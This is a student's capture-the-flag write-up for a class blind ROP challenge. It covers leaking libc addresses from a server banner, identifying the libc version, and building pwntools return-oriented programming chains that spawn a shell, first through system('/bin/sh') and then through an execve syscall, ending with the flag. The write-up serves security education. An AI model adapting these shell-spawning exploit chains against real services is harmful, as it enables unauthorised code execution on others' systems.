# BROP1:Solution

This is the output from connecting the the remote server, since there's no binary to analyze:
```
--------------------------------------------------------------------------------
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXK0OOOOOO0KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMWWXOxoc:;;,,,,,,;;:coxOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWXOo:;,,,,,,,,,,,,,,,,,,;:oOXWMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXxc;,,,,,,,,,,,,,,,,,,,,,,,,;cxXWMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMWNkc,,,,,,,,,,,,,,,,,,,,;clddc,,,;ckNWMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWXd;,,,,,,,,,,,,,,;:cloxOKXWWWk;,,,,;dXWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMXo;,,,,,,,,,,,,;lk0XNNWMMMMMMWk;,,,,,;oXMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMNx;,,,,,,,,,,,,,;kWWMMMMMMMMMMWk;,,,,,,;xNMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMW0c,,,,,,,,,,,,,,:kWMMMMMMWWNXNNk;,,,,,,,c0WMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWx;,,,,,,,,,,,,,,:kWWNXX0kxoccxNk;,,,,,,,;xWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd,,,,,,,,,,,,,,,;kXklc:;,,,,;xXk;,,,,,,,,dNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,:kKd,,,,;ldxkKNk;,,,,,,,;dNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWk:,,,,,,,,,,,,,,;kKd,,;o0NWMMMNx;,,,,,,,:kWMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,;cldxKXd,,lKWMMMWNOl,,,,,,,,lKMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMWOc,,,,,,,;oOXWWMWXd,,:d0KKOxo:,,,,,,,,cOWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWOc,,,,,,dXWMMMMNOc,,,,;;;,,,,,,,,,,,cOWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMW0l;,,,,lOKXX0ko:,,,,,,,,,,,,,,,,,;l0WMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMWXxc,,,,;:::;,,,,,,,,,,,,,,,,,,,cxXWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWKxl;,,,,,,,,,,,,,,,,,,,,,,;lkKWMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMWN0xo:;,,,,,,,,,,,,,,;:ox0NWMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWX0kxdollllllodxk0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
--------------------------------------------------------------------------------
                             address of printf() 0x7f8d59fb5700 
                              address of puts() 0x7f8d59fdc9e0 
--------------------------------------------------------------------------------
                        I was young, but I wasn't naive
                I watched helpless as you turned around to leave
                   And still I have the pain I have to carry
                              - Blind, Lifehouse 
--------------------------------------------------------------------------------
```

Since one of the addresses given is the puts() function, it seems like this should be a ret2puts/ret2libc exploit. 

First we can use the addresses of printf() and puts() to find the version of libc being used on the remote server.
```
~/workspace/vuln/libc_stuff/libc-database]
    ./find puts 9e0
    ubuntu-glibc (libc6_2.36-0ubuntu4_amd64)
```

When I downloaded it from the database it turned out to be a directory, and the version inside the directory I used was libc.so.6

Then we can calculate the base address of libc, and check that the address ends in 000.
```
# Calculate offset        
libc.address = puts - libc.sym['puts']

log.success(f"libc offset @ {hex(libc.address)}")
```

To find the oveflow of the buffer I sent multiples of 8 into the program until It stopped returning and EOF then decreased by 1 until it came back, later Chandler was kind enough to show me the automated loop he used and for future reference I'm adding it to the repository I keep for class. I tend to make things harder for myself than they need to be.

Then I tried to do a ret2libc
```
# overflow
chain = b'A' * 72
chain += p64(libc.address + r.find_gadget(['ret'])[0]) # 8 bytes to align stack
chain += p64(libc.address + r.find_gadget(['pop rdi','ret'])[0]) # returns list of gadgets [0] takes first one
chain += p64(libc.address + next(libc.search(b'/bin/sh\x00')))
chain += p64(libc.address + libc.sym['system'])

p.sendline(chain)
p.interactive()
```

This however didn't seem to be working, and when I consulted fellow classmates, they also seemed to have some issue with this and it was an issue with 'system'. So I pivoted to the recommended execve path. 
```
# setup a few gadgets
syscall = offset + r.find_gadget(['syscall', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))

# chain = b'A' * 72                                                     # overflow
chain = cyclic(72)
chain += p64(offset + r.find_gadget(['pop rdi', 'ret'])[0])             # clear rdi
chain += p64(offset + bin_sh)                                           # set rdi -> /bin/sh
chain += p64(offset + r.find_gadget(['pop rsi', 'ret'])[0])             # clear rsi
chain += p64(0)
chain += p64(offset + r.find_gadget(['pop rdx', 'ret'])[0])             # clear rdx
chain += p64(0)
chain += p64(offset + r.find_gadget(['pop rax', 'ret'])[0])             # clear rax
chain += p64(59)                                                        # execve
chain += p64(syscall)                                                   # execute syscall
```

Proceed to foget to pop rax for an hour and keep checking that you typed the rest of the find_gadgets correct until someone else checks your code. Add another hour for forgetting to add the offset to /bin/sh, then accidentally adding it twice to syscall.

Then send the chain after the last of the command line output and get the flag!
```
flag{I_n3v3r_th0ught_we_d_B_h3r3}
```

Resources:
* Class slides 
* Louie
* Chandler
* https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
* https://man7.org/linux/man-pages/man2/execve.2.html
